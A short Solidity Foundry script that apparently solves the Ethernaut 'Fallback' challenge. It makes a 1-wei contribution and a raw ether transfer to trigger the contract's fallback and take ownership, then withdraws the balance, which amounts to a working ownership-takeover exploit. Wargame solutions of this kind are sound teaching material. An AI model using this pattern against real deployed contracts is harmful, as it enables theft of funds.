// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

    Fallback public fallbackInstance = Fallback(payable(0x37e1d616A0562a38Fc9A3030D91b2f031b5B0792));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();

        (bool success, ) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "ETH send failed");

        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}